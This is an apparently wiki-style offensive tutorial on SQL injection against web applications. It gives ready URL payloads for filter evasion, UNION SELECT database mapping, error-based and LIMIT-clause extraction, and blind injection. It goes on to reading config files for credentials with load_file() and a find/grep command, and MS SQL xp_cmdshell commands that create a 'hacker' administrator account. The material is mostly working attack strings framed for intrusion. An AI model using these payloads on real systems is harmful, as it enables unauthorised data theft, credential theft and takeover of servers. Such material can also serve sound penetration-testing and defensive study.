<p>If <a href="/XSS" title="XSS">XSS</a> filtering is encountered, chances are the standard comparison operators (&#x3d;, &lt;,&gt;) are being filtered out.  If this is the case, '<i>alternative comparison operators</i> will need to be used':
</p>
<table class="wikitable" width="100%">
<tr>
<td>
<ul><li> <b>[VALUE] BETWEEN ... AND ...</b>
</li><li> <b>[VALUE] REGEXP [PATTERN]</b> - <i>MySQL</i>
</li><li> <b>[VALUE] RLIKE [PATTERN]</b> - <i>MS SQL</i>
</li><li> <b>[VALUE] ~ [PATTERN]</b> - <i>PostgreSQL</i>
</li></ul>
</td></tr></table>
<h3> <span class="mw-headline" id="Testing_with_BETWEEN">Testing with BETWEEN</span></h3>
<p>The between operator is universal across all <a href="/SQL" title="SQL">SQL</a> platforms with the same syntax, and as a result is a more reliable testing method.
</p>
<ul><li> <i>The between comparison operator will return true or false based on whether or not the preceding value is between a ceiling and a floor in a range.  For example, 50 is between 0 and 100, but 300 is not, which safely avoids using the <b>&#x3d;</b> operator in the query:</i>
</li></ul>
<pre> and%2050%20between%200%20and%20100   (<b>True</b>)
 and%20300%20between%200%20and%20100  (<b>False</b>)
</pre>
<ul><li> <i>This turns the query into something like:</i>
</li></ul>
<pre> select * from articles where id&#x3d;1 and 50 between 0 and 100
 select * from articles where id&#x3d;1 and 300 between 0 and 100
</pre>
<p>The <b>between</b> operator can also be used on strings:
</p>
<pre> and%20'c'%20between%20'a'%20and%20'm (<b>True</b>)
 and%20'z'%20between%20'a'%20and%20'm (<b>False</b>)
</pre>
<h3> <span class="mw-headline" id="Testing_with_Regular_Expression_Operators_.28REGEXP.2C_.7E.2C_and_RLIKE.29">Testing with Regular Expression Operators (<i>REGEXP, ~, and RLIKE</i>)</span></h3>
<ul><li> <i>Different <a href="/Database" title="Database">database</a> engines have different operators for Regular Expressions:</i>
</li></ul>
<p><b>MySQL</b> uses the <b>REGEXP</b> operator.
</p><p><b>PostgreSQL</b> uses the <b>~</b> operator.
</p><p><b>MS SQL</b> uses the <b>RLIKE</b> operator.
</p><p><i>Regular expressions are the most evasive method for remote <a href="/SQL" title="SQL">SQL</a> injection possible, as they lack many of the common syntax characters necessary for <a href="/Types_of_web_exploitation" title="Types of web exploitation" class="mw-redirect">other forms of injection</a>.</i>
</p><p><i>The following tests contruct strings using native string constructors to bypass any requirement for quotes.  For more information regarding this, please see the entry on <b><a href="/Sql_injection_without_quotes" title="Sql injection without quotes" class="mw-redirect">sql injection without quotes</a></b>.</i>
</p>
<table class="wikitable" width="100%">
<tr>
<td>
<p>Below are either <a href="/Ascii_shellcode" title="Ascii shellcode">hexadecimal character codes</a> or ascii code equivilent characters being translated into a string by the <a href="/SQL" title="SQL">SQL</a> server.  Understanding is required in order to become proficient in <a href="/SQL" title="SQL">SQL</a> injection.&lt;/i&gt;
</p>
<ul><li> <b><u><a href="/MySQL" title="MySQL">MySQL</a> testing</u>:</b>
</li></ul>
<table class="wikitable" width="100%">
<tr>
<td>
<b>True:</b>  <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1"><span class="kw1">AND</span> 0x2e <span class="kw1">REGEXP</span> 0x2e</pre></div></div>
  <b>False:</b> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1"><span class="kw1">AND</span> 0x6a <span class="kw1">REGEXP</span> 0x7a</pre></div></div>
</td></tr></table>
<ul><li> <b><u>PostgreSQL testing</u>:</b>
</li></ul>
<table class="wikitable" width="100%">
<tr>
<td>
<b>True:</b>  <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1"><span class="kw1">AND</span> chr<span class="br0">&#40;</span><span class="nu0">97</span><span class="br0">&#41;</span> ~ chr<span class="br0">&#40;</span><span class="nu0">97</span><span class="br0">&#41;</span></pre></div></div>
  <b>False:</b> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1"><span class="kw1">AND</span> chr<span class="br0">&#40;</span><span class="nu0">98</span><span class="br0">&#41;</span> ~ chr<span class="br0">&#40;</span><span class="nu0">99</span><span class="br0">&#41;</span></pre></div></div>
</td></tr></table>
<ul><li> <b><u>MS SQL testing</u>:</b>
</li></ul>
<table class="wikitable" width="100%">
<tr>
<td>
<b>True:</b>  <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1"><span class="kw1">AND</span> <span class="kw1">CHAR</span><span class="br0">&#40;</span><span class="nu0">97</span><span class="br0">&#41;</span> <span class="kw1">RLIKE</span> <span class="kw1">CHAR</span><span class="br0">&#40;</span><span class="nu0">97</span><span class="br0">&#41;</span></pre></div></div>
  <b>False:</b> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1"><span class="kw1">AND</span> <span class="kw1">CHAR</span><span class="br0">&#40;</span><span class="nu0">104</span><span class="br0">&#41;</span> <span class="kw1">RLIKE</span> <span class="kw1">CHAR</span><span class="br0">&#40;</span><span class="nu0">64</span><span class="br0">&#41;</span></pre></div></div>
</td></tr></table>
</td></tr></table>
<h1> <span class="mw-headline" id="Intermediate_SQL_injection">Intermediate SQL injection</span></h1>
<p>There are various methods for exploiting various databasing engines, including <a href="/MySQL" title="MySQL">MySQL</a>, PostgreSQL and Microsoft SQL server.  Different engines may require <a href="#Functions_.26_Environment_Variables">different function names, environment variables, or syntax nuances</a> for proper effectiveness.
</p><p>Example testing is not included for <a href="/SQL_Orientation#UPDATE_-_Modify_rows_in_a_table" title="SQL Orientation" class="mw-redirect"><b>UPDATE</b></a> or <a href="/SQL_Orientation#INSERT_-_Add_rows_to_a_table" title="SQL Orientation" class="mw-redirect"><b>INSERT</b></a> queries using <b>subqueries</b>.  In those cases, it is best to escape the argument, use a comma delimiter, and testing using integers until the right number of columns is found.  Then substitute column values for insert and delete using <b>subqueries</b> that return a single cell rather than a single <a href="/Byte" title="Byte">byte</a>, similar to <a href="#Expert:_Automated_Blind_Extraction">blind extraction</a>.
</p>
<h3> <span class="mw-headline" id="Automation_theory"> Automation theory </span></h3>
<p>The most important thing when automating <a href="/SQL" title="SQL">SQL</a> injection is recognizing boundaries.
</p>
<table class="wikitable" width="100%">
<tr>
<td>
<p>Loop Delimeters:
</p>
<ul><li> Length of single cell strings (length sql functions)
</li></ul>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1"><span class="kw1">SELECT</span> <span class="kw1">LENGTH</span><span class="br0">&#40;</span><span class="kw1">USER</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="br0">&#41;</span>
<span class="kw1">SELECT</span> <span class="kw1">CHAR_LENGTH</span><span class="br0">&#40;</span><span class="kw1">USER</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="br0">&#41;</span>
<span class="kw1">SELECT</span> len<span class="br0">&#40;</span><span class="kw1">USER</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="br0">&#41;</span></pre></div></div>
</td></tr></table>
<ul><li> Number of rows returned by a query (count sql functions)
</li></ul>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1"><span class="kw1">SELECT</span> <span class="kw1">COUNT</span><span class="br0">&#40;</span>column_name<span class="br0">&#41;</span> <span class="kw1">FROM</span> information_schema<span class="sy0">.</span><span class="kw1">COLUMNS</span> <span class="kw1">WHERE</span> <span class="kw1">TABLE_NAME</span><span class="sy0">=</span><span class="br0">&#91;</span><span class="kw1">TABLE_NAME</span><span class="br0">&#93;</span> <span class="kw1">AND</span> table_schema<span class="sy0">=</span><span class="br0">&#91;</span><span class="kw1">DATABASE</span><span class="br0">&#93;</span></pre></div></div>
</td></tr></table>
<p>Obtaining data types:
</p>
<ul><li> Data types of single cells (type from information_schema.columns)
</li></ul>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1"><span class="kw1">SELECT</span> column_type <span class="kw1">FROM</span> information_schema<span class="sy0">.</span><span class="kw1">COLUMNS</span> <span class="kw1">WHERE</span> <span class="kw1">TABLE_NAME</span><span class="sy0">=</span><span class="br0">&#91;</span><span class="kw1">TABLE_NAME</span><span class="br0">&#93;</span> <span class="kw1">AND</span> column_name<span class="sy0">=</span><span class="br0">&#91;</span>column_name<span class="br0">&#93;</span> <span class="kw1">AND</span> table_schema<span class="sy0">=</span><span class="br0">&#91;</span><span class="kw1">DATABASE</span><span class="br0">&#93;</span></pre></div></div>
</td></tr></table>
<div style="padding: .2em .3em; margin: .2em .2em; background-color: #98AFC7; border: solid 1px #25383C; font-size: 107%;"><strong>Protip:</strong> It is a good idea to use order by every time injection occurs in case results are not constant due to <b>where</b> clause restraints.</div>
</td></tr></table>
<p><br />
Sometimes integer values won't be able to be selected when using error-based injection.  There's more than one way to solve this.
</p>
<table class="wikitable" width="100%">
<tr>
<td>
<ul><li> Predefined scope
</li></ul>
<p>Use ORDER by to find the upper most row and lower most row of the results set.  It can be stopped by starting at an element on one end and then keeping the order by clause intact, incrementing the offset; it will stop when it has reached the value on the other end of the table.
</p>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="php source-php"><pre class="de1">    <span class="re0">$stop_value</span>  <span class="sy0">=</span> <span class="st0">&quot;select id from table order by id desc limit 1 offset 0&quot;</span><span class="sy0">;</span>
    <span class="re0">$start_query</span> <span class="sy0">=</span> <span class="st0">&quot;select id from table order by id asc limit 1 offset 0&quot;</span><span class="sy0">;</span></pre></div></div>
<p>In the loop:
</p>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="php source-php"><pre class="de1">    <span class="re0">$loop_query</span> <span class="sy0">=</span> <span class="st0">&quot;select id from table order by id asc limit 1 offset <span class="es4">$counter</span>&quot;</span><span class="sy0">;</span></pre></div></div>
<p><i>When the value returned by $loop_query equals the value from $stop_query, terminate the loop.</i>
</p>
<ul><li> Cast and concatenate
</li></ul>
<p>attempt to string concatenate a character to the integer to throw an error.
</p>
</td></tr></table>
<p><br />
Here are a few variables to be aware of while writing automated exploit software.
</p>
<table class="wikitable" width="100%">
<tr>
<td>
<p><b>Counters</b>:
</p>
<ul><li> Row Counter
</li><li> Byte Index Counter
</li></ul>
<p><b>Temporary Variables</b>:
</p>
<ul><li> Length of current target cell
</li><li> Number of rows in current target table
</li></ul>
<p><b><a href="/SQL" title="SQL">SQL</a> Dialect Variables</b>:
</p>
<ul><li> Sanitized Syntax Characters
</li><li> Whitespace character(s)
</li><li> String concatenation operator
</li><li> Comment syntax
</li></ul>
</td></tr></table>
<h2> <span class="mw-headline" id="Basic_Injection_:_Union_Select"> Basic Injection&#160;: Union Select </span></h2>
<ul><li> The <b>UNION</b> operator allows collection of the output of two SELECT statments with <b>UNION ALL SELECT</b> or <b>UNION SELECT</b> so long as the results have the
</li></ul>
<p>same number of columns:
</p>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1"><span class="kw1">SELECT</span> <span class="kw1">COLUMN</span> <span class="kw1">FROM</span> <span class="kw1">TABLE</span> <span class="kw1">UNION</span> <span class="kw1">ALL</span> <span class="kw1">SELECT</span> <span class="kw1">COLUMN</span></pre></div></div>
</td></tr></table>
<h3> <span class="mw-headline" id="Determining_the_number_of_columns"> Determining the number of columns </span></h3>
<p>The number of columns can be determined using ORDER BY injection and incrementing a field index, for example:
</p>
<pre> /article.php?id&#x3d;1 ORDER BY 1 asc
 /article.php?id&#x3d;1 ORDER BY 2 asc
</pre>
<div style="padding: .2em .3em; margin: .2em .2em; background-color: #FFF6BF; border: solid 2px #FFD324; font-size: 107%;"><b>Notice:</b> 
<ul><li> When the page no longer displays, a boundary has been hit.  The largest number in the order by clause that still allows the page to display properly is the number of columns.</div>
</li></ul>
<p><br />
</p>
<h3> <span class="mw-headline" id="Extracting_data"> Extracting data </span></h3>
<p>If the number of columns is known in a table (for example, by using the ORDER BY injection technique), the following injection can be used assuming that there are 2 columns:
</p>
<pre> /article.php?id&#x3d;5 UNION ALL SELECT 1,2/*
</pre>
<div style="padding: .2em .3em; margin: .2em .2em; background-color: #98AFC7; border: solid 1px #25383C; font-size: 107%;"><strong>Protip:</strong> Sometimes UNION ALL SELECT will not work, but UNION SELECT will, and vice versa.  This has to do with the <a href="/SQL" title="SQL">SQL</a> engine and <a href="/Vulnerability" title="Vulnerability">vulnerable</a> <a href="/Web_applications" title="Web applications" class="mw-redirect">web application</a>'s programming or <a href="/SQL" title="SQL">SQL</a> queries.  Additionally, an invalid ID may be set(e.g. -1) to get the data the UNION SELECT returns to display on the page.</div>
<table class="wikitable" width="100%">
<tr>
<td>
<ul><li> <b>This generates the following query:</b>
</li></ul>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1"><span class="kw1">SELECT</span> <span class="sy0">*</span> <span class="kw1">FROM</span> ARTICLES <span class="kw1">WHERE</span> id<span class="sy0">=</span><span class="nu0">5</span> <span class="kw1">UNION</span> <span class="kw1">ALL</span> <span class="kw1">SELECT</span> <span class="nu0">1</span><span class="sy0">,</span><span class="nu0">2</span><span class="coMULTI">/*</span></pre></div></div>
</td></tr></table><div style="padding: .2em .3em; margin: .2em .2em; background-color: #FFF6BF; border: solid 2px #FFD324; font-size: 107%;"><b>Notice:</b> This selects every entry where both id&#x3d;5 and where column &#x3d; 1 or 2.  If the number 1 or 2 was outputted, UNION would be demonstrated to work.  If 2 was output, it is known that the <a href="/Web_applications" title="Web applications" class="mw-redirect">application</a>'s programming displays the second column on the page. (This could be any column, really.)</div>
<ul><li> <b>An example of SQL injection using union select to obtain the <a href="/SQL" title="SQL">SQL</a> version:</b>
</li></ul>
<pre> /article.php?id&#x3d;-1 UNION ALL SELECT 1,version()/*
</pre>
<p><i>The version information should now be displayed in the area where the number `2' originally displayed.</i>
</p>
<ul><li> <b>Once we know this, obtaining data is as simple as setting up the query as a simple select:</b>
</li></ul>
<pre> /article.php?id&#x3d;-1 UNION ALL SELECT 1,table_name from information_schema.tables where table_schema&#x3d;database() limit 1/*
</pre>
<p><i>In this case, the first table name in the current database should be displayed in stead of the version information. </i>
</p>
<ul><li> <b>This particular injection appears at first glance to be limited to a single entry (unless more columns are available for display), but in truth one can use the string concatenation functions or operators (<i>+, &#x7c;&#x7c;, concat(), group_concat()</i>, etc) to display the contents of several columns and/or rows as a single string:</b>
</li></ul>
<pre> /article.php?id&#x3d;-1 UNION ALL SELECT 1,group_concat(table_name,0x2e,column_name) from information_schema.columns where table_schema&#x3d;database()/*
</pre>
<ul><li> <b>Which would format a map of a MySQL database in the format:</b>
</li></ul>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1"> table1<span class="sy0">.</span>column1<span class="sy0">,</span> table1<span class="sy0">.</span>column2<span class="sy0">,</span> table2<span class="sy0">.</span>column1</pre></div></div>
</td></tr></table>
<p><i>The amount of data that can be returned returned by the <b>group_concat()</b> function is set by a session environment variable.</i>
</p>
</td></tr></table>
<p><br />
</p><p><br />
</p>
<h2> <span class="mw-headline" id="Intermediate_testing:_.22SELECT.22_..._LIMIT_clause_injections">Intermediate testing: "SELECT" ... LIMIT clause injections</span></h2>
<div style="padding: .2em .3em; margin: .2em .2em; background-color: #98AFC7; border: solid 1px #25383C; font-size: 107%;"><strong>Protip:</strong> <i>Microsoft SQL Server does not feature this classification of vulnerability due to its lack of a <b>LIMIT</b> clause, however similar techniques to the <b>LIMIT</b> clause attack will work on it as well as other database engines:</i>
<table class="wikitable" width="100%">
<tr>
<td>
<ul><li> <b>GROUP BY</b> clause injection
</li><li> <b>ORDER BY</b> clause injection
</li></ul>
</td></tr></table> </div>
<center>To test for injection in a LIMIT clause, it is first necessary to determine which input of the LIMIT clause that is being injected into.  The following example <b>URI</b> will be used:</center>
<pre> <i>/view_results.php?start&#x3d;30&amp;perpage&#x3d;10</i>
</pre>
<table style="background: #F8F8FF; border: 2px solid #8888AA; width: 90%; margin: 5px auto; border-radius: 10px; -moz-border-radius: 10px; -webkit-border-radius: 10px; -khtml-border-radius: 10px; -icab-border-radius: 10px; -o-border-radius: 10px;">
<tr>
<td width="1%" style="padding-right:1em;"><img src="http://i.imgur.com/c3el4.png" alt="c3el4.png" />
</td>
<td>A LIMIT clause may have two different inputs, one being the number of rows to return, the other being what row to start from when selecting the rows.  On recent versions of MySQL the limit clause syntax is congruent to PostgreSQL syntax:
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1"><span class="kw1">LIMIT</span> $perpage OFFSET $start</pre></div></div>
</td></tr></table>
</td></tr></table>
<table style="background: #F8F8FF; border: 2px solid #8888AA; width: 90%; margin: 5px auto; border-radius: 10px; -moz-border-radius: 10px; -webkit-border-radius: 10px; -khtml-border-radius: 10px; -icab-border-radius: 10px; -o-border-radius: 10px;">
<tr>
<td width="1%" style="padding-right:1em;"><img src="http://i.imgur.com/c3el4.png" alt="c3el4.png" />
</td>
<td>On older versions of MySQL, the <b>offset</b> operator was not supported.  In those cases the older syntax will be used:
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1"><span class="kw1">LIMIT</span> $start<span class="sy0">,</span>$perpage</pre></div></div>
</td></tr></table>
</td></tr></table>
<ul><li> Because the input is located at either $start or $perpage in a LIMIT clause, it can be deduced that:
</li></ul>
<pre> <b>UNION SELECT</b> is the only available method for successful exploitation.
 The rest of the query will have to be commented out for successful exploitation.
</pre>
<ul><li> In order to access <b>UNION SELECT</b> if there are data limitations:
</li></ul>
<pre> The <b>LIMIT</b> clause must be given an impossible starting offset so that no data will be displayed,
 making room for data returned by the <b>UNION SELECT</b>.  The offset will have to be a larger number
 than the number of rows returned by the query.
</pre>
<p><br />
</p>
<h2> <span class="mw-headline" id="Intermediate_injection:_information_retrieval_via_verbose_errors"> Intermediate injection: information retrieval via verbose errors </span></h2>
<p><i>This technique relies on the following database and application characteristics:</i>
</p>
<ul><li> <i>Sometimes databases display errors containing selected data even though union select is not an option.</i>
</li><li> <i>Sometimes the <a href="/Web_applications" title="Web applications" class="mw-redirect">application</a> will display <a href="/SQL" title="SQL">SQL</a> errors on the page.</i>
</li></ul>
<div style="padding: .2em .3em; margin: .2em .2em; background-color: #98AFC7; border: solid 1px #25383C; font-size: 107%;"><strong>Protip:</strong> <b><i>There are two ways to cause errors that contain data:</i></b>
<ul><li> <b>An impossible cast</b>
</li><li> <b>A duplicate key in a group by statement</b>
</li></ul>
</div>
<p>When a <a href="/Web_applications" title="Web applications" class="mw-redirect">web application</a> displays its <a href="/SQL" title="SQL">SQL</a> errors, there's a few things that can be done to make errors display data along with them.  In each of the examples below, the <b>@@database</b> variable or <b>current_database()/database()</b> functions return what can be seen for error output.  <b><i>These can be replaced with any subquery'd select statement that returns a single cell.</i></b>
</p>
<table class="wikitable" width="100%">
<tr>
<td>
<ul><li> <b>MSSQL:</b><div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1">  <span class="kw1">AND</span> <span class="nu0">1</span><span class="sy0">=</span><span class="kw1">CAST</span><span class="br0">&#40;</span>@@<span class="kw1">DATABASE</span> <span class="kw1">AS</span> <span class="kw1">INT</span><span class="br0">&#41;</span><span class="co1">--</span></pre></div></div><div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1">  <span class="kw1">AND</span> <span class="nu0">1</span><span class="sy0">=</span><span class="kw1">CONVERT</span><span class="br0">&#40;</span><span class="kw1">INT</span><span class="sy0">,</span>@@<span class="kw1">DATABASE</span><span class="br0">&#41;</span><span class="co1">--</span></pre></div></div>
</li></ul>
<ul><li> <b>MySQL:</b><div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1">  <span class="kw1">AND</span> <span class="nu0">1</span><span class="sy0">=</span><span class="nu0">2</span> <span class="kw1">OR</span> <span class="kw1">ROW</span><span class="br0">&#40;</span><span class="nu0">1</span><span class="sy0">,</span><span class="nu0">1</span><span class="br0">&#41;</span> <span class="sy0">&gt;</span> <span class="br0">&#40;</span><span class="kw1">SELECT</span> <span class="kw1">COUNT</span><span class="br0">&#40;</span><span class="sy0">*</span><span class="br0">&#41;</span><span class="sy0">,</span>concat<span class="br0">&#40;</span><span class="kw1">DATABASE</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">,</span>0x3a<span class="sy0">,</span><span class="kw1">FLOOR</span><span class="br0">&#40;</span>rand<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">*</span><span class="nu0">2</span><span class="br0">&#41;</span> <span class="br0">&#41;</span> x <span class="kw1">FROM</span> <span class="br0">&#40;</span><span class="kw1">SELECT</span> <span class="nu0">1</span> <span class="kw1">UNION</span> <span class="kw1">SELECT</span> <span class="nu0">2</span><span class="br0">&#41;</span> a <span class="kw1">GROUP</span> <span class="kw1">BY</span> x <span class="kw1">LIMIT</span> <span class="nu0">0</span><span class="sy0">,</span><span class="nu0">1</span><span class="br0">&#41;</span></pre></div></div>
</li></ul>
<ul><li> <b>PostgreSQL:</b><div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1">  <span class="kw1">AND</span> <span class="nu0">3</span><span class="sy0">=</span><span class="nu0">5</span> <span class="kw1">OR</span> <span class="br0">&#40;</span><span class="kw1">SELECT</span> <span class="kw1">CAST</span><span class="br0">&#40;</span>current_database<span class="br0">&#40;</span><span class="br0">&#41;</span> <span class="kw1">AS</span> <span class="kw1">NUMERIC</span><span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="sy0">=</span> <span class="br0">&#40;</span><span class="kw1">SELECT</span> <span class="kw1">CURRENT_USER</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="br0">&#41;</span></pre></div></div>
</li></ul>
</td></tr></table>
<h1> <span class="mw-headline" id="Blind_SQL_injection"> Blind SQL injection </span></h1>
<dl><dd><i>Related tools: <a href="/Mysqli-blindutils" title="Mysqli-blindutils">mysqli-blindutils</a></i>
</dd></dl>
<p>There are primarily two types of blind <a href="/Sql_injection" title="Sql injection" class="mw-redirect">sql injection</a> <a href="/Vulnerability" title="Vulnerability">vulnerabilities</a>: <b>partial blind</b> and <b>total blind</b>.
</p><p>Partial blind injection is referred to as <i>partial</i> because data returned by the <a href="/Application" title="Application">application</a> changes to some extent.  This may mean it simply does not display in one instance while it displays in the other.
</p><p>Completely blind <a href="/Vulnerability" title="Vulnerability">vulnerabilities</a> will not result in a change of the returned dataset in the page output, thus timing attacks must be utilized for successful exploitation because they affect the <a href="/HTTP" title="HTTP">HTTP</a> response <i>time</i> rather than the HTTP response <i>data</i>.
</p><p>There are traditionally two types of <a href="/Exploitation" title="Exploitation" class="mw-redirect">exploitation</a> for blind <a href="/Sql_injection" title="Sql injection" class="mw-redirect">sql injection</a>:
</p>
<ul><li> Blind data extraction
</li><li> Boolean enumeration
</li></ul>
<p>Each exploitation method has viable options for both partial blind and total blind injection.  Blind data extraction is by far faster than boolean enumeration.  When using boolean enumeration for exploitation of sql injection, an attacker is able to receive only one bit of data per request.  With printable text characters this usually requires 7 requests (because the highest order bit is never set in latin1 printable characters), however this will require up to 8 requests for a <a href="/Byte" title="Byte">byte</a> of <a href="/Binary" title="Binary" class="mw-redirect">binary</a> data.  In comparison, blind extraction can be used to retrieve values exceeding a full byte per request.
</p><p><br />
</p>
<h3> <span class="mw-headline" id="Blind_extraction"> Blind extraction </span></h3>
<p><b>There are two types of blind SQL extraction attacks:</b>
</p>
<ul><li> Partial-blind: <a href="/Comparative_precomputation" title="Comparative precomputation" class="mw-redirect">Pre-computation based</a> (Tool: <a href="/Mysqli-blindutils" title="Mysqli-blindutils">mysqli-blindutils</a> &gt; <a href="/Sqli-hap.py" title="Sqli-hap.py">sqli-hap.py</a>)
</li><li> Full-blind: <a href="/Timing_based_extraction" title="Timing based extraction" class="mw-redirect">Timing based</a>
</li></ul>
<p><br />
<b>The only things that these methods have in common is:</b>
</p>
<ul><li> <u>These attacks</u> are all limited in some fashion because of environment and latency or dataset, respectively.
</li><li> <u>Successful exploitation</u> requires automation <a href="/Programming" title="Programming" class="mw-redirect">programming</a>.
</li></ul>
<h3> <span class="mw-headline" id="Boolean_Enumeration"> Boolean Enumeration </span></h3>
<p><b>There are primarily two types of attacks used for <a href="/Boolean_enumeration" title="Boolean enumeration">boolean enumeration</a>:</b>
</p>
<ul><li> Partial-blind: <a href="/Response-based_boolean_enumeration" title="Response-based boolean enumeration" class="mw-redirect">Response based</a> (Tool: <a href="/Mysqli-blindutils" title="Mysqli-blindutils">mysqli-blindutils</a> &gt; <a href="/Sqli-p.pl" title="Sqli-p.pl" class="mw-redirect">sqli-p.pl</a>)
</li><li> Full-blind: <a href="/Timing-based_boolean_enumeration" title="Timing-based boolean enumeration" class="mw-redirect">Timing based</a> (Tool: <a href="/Mysqli-blindutils" title="Mysqli-blindutils">mysqli-blindutils</a> &gt; <a href="/Sqli-slee.py" title="Sqli-slee.py" class="mw-redirect">sqli-slee.py</a>)
</li></ul>
<h1> <span class="mw-headline" id="Further_penetration">Further penetration</span></h1>
<dl><dd><i>Most demonstrated methods require additional privileges</i>
</dd></dl>
<h3> <span class="mw-headline" id="Obtaining_direct_database_access"> Obtaining direct database access</span></h3>
<i><b><center>Requires a privileged <a href="/User" title="User">user</a> or valid <a href="/Privilege_escalation" title="Privilege escalation">privilege escalation</a></center></b></i> 
<p>There are several methods for obtaining direct <a href="/Database" title="Database">database</a> access so that log in can occur remotely.  
</p>
<ul><li> See the <b>Privileged</b> query cheat sheets for queries to directly obtain database credentials using <a href="/SQL" title="SQL">SQL</a> injection
</li><li> Obtaining <a href="/Authentication_credential" title="Authentication credential">authentication credentials</a> from the web application configuration file by <a href="#Obtaining_filesystem_access">accessing the filesystem</a>
</li></ul>
<dl><dd>
</dd></dl>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1">  <span class="kw1">SELECT</span> load_file<span class="br0">&#40;</span><span class="st0">'/path/to/config.php'</span><span class="br0">&#41;</span>;</pre></div></div>
</td></tr></table>
<ul><li> After escalating privileges to administrator of the web application using its administrative interface to run queries directly find the <a href="/Authentication_credential" title="Authentication credential">authentication credentials</a> in the configuration file with a file editor 
</li></ul>
<p>Obtaining <a href="/Authentication_credential" title="Authentication credential">authentication credentials</a> from the <a href="/Web_applications" title="Web applications" class="mw-redirect">web application</a>'s configuration file using <a href="#Obtaining_Code_Execution">code-execution</a> after <a href="/Privilege_escalation" title="Privilege escalation">privilege escalation</a>
</p>
<table cellspacing="0" width="80%">
<tr style="background-color: #5E5C5D">
  <td style="color: white"> <strong>Terminal</strong></td>
</tr>
<tr style="background-color: black"><td><br /></td></tr>
<tr style="background-color: black">
  <td style="color: white"><font color="royalblue">localhost</font>:<font color="red">~</font> <font color="green">$</font> <strong>find -name \*conf\*.php -exec grep -iHn "user\&#x7c;name\&#x7c;pass\&#x7c;host" '{}' \;</strong></td>
</tr>
<tr style="background-color: black"><td><br /></td></tr>
</table>
<h3> <span class="mw-headline" id="Obtaining_filesystem_access"> Obtaining filesystem access </span></h3>
<p><b>This will require </b><a href="/MySQL" title="MySQL">MySQL</a><b>, depend on the SQL server configuration as well as the OS configuration, the user in context must have the FILE privilege.</b>
</p>
<table class="wikitable" width="100%">
<tr>
<td>
<ul><li> <i><b>load_file()</b></i>
</li></ul>
<dl><dd>Mysql's <b>load_file()</b> function takes a single <b>string literal</b> (it can be bypassed with <a href="#Quotes">0x[hex]</a>) as a filename and <b>returns</b> either the <b>file contents as a single-cell string</b> or <b>null</b> if the query failed for <b>any</b> reason.
</dd></dl>
<ul><li> <i><b>select ... into outfile</b></i>
</li></ul>
<dl><dd><b>into outfile</b> is limited in that it cannot receive a string literal, but must be a constant.
</dd></dl>
</td></tr></table>
<p><i><u>Examples of these are located in the <a href="#Privileged_Mysql_.28Any_version.29_User"><b>priveleged MySQL cheat sheet</b></a></u></i>.
</p>
<h3> <span class="mw-headline" id="Obtaining_code_execution"> Obtaining code execution </span></h3>
<ul><li> <i>Through the <a href="/Vulnerability" title="Vulnerability">vulnerable</a> <a href="/Web_applications" title="Web applications" class="mw-redirect">web application</a>:</i>
</li></ul>
<p>It is possible that the administrative interface will contain template and theme editors and the ability to add/modify/delete <a href="/PHP" title="PHP">PHP</a> or other <a href="/Interpreted_languages" title="Interpreted languages" class="mw-redirect">interpreted languages</a> in the associated files.  Knowing this is just one more reason to make a beeline for the user table for the affected <a href="/Web_applications" title="Web applications" class="mw-redirect">web application</a> and get to <a href="/Cryptography#Commandline_Tools" title="Cryptography">cracking</a> the <a href="/Authentication_credential" title="Authentication credential">authentication credentials</a> for the admin <a href="/User" title="User">user</a>.
</p>
<ul><li> Via <a href="/Database" title="Database">database</a> engine (<b>MS SQL</b>-specific)
</li></ul>
<p>By ending the query with a semicolon or comment delimiter and beginning a new query, we can get <b>MS SQL</b> to run
</p>
<pre>;exec master..xp_cmdshell 'net user hacker hacker_password /add'
;exec master..xp_cmdshell 'net localgroup administrators hacker /add'
/url.asp?ArticleID=1;exec master..xp_cmdshell 'net user hacker hackerpassword /add';--
/url.asp?ArticleID=1;exec master..xp_cmdshell 'net localgroup administrators hacker /add';--
</pre>
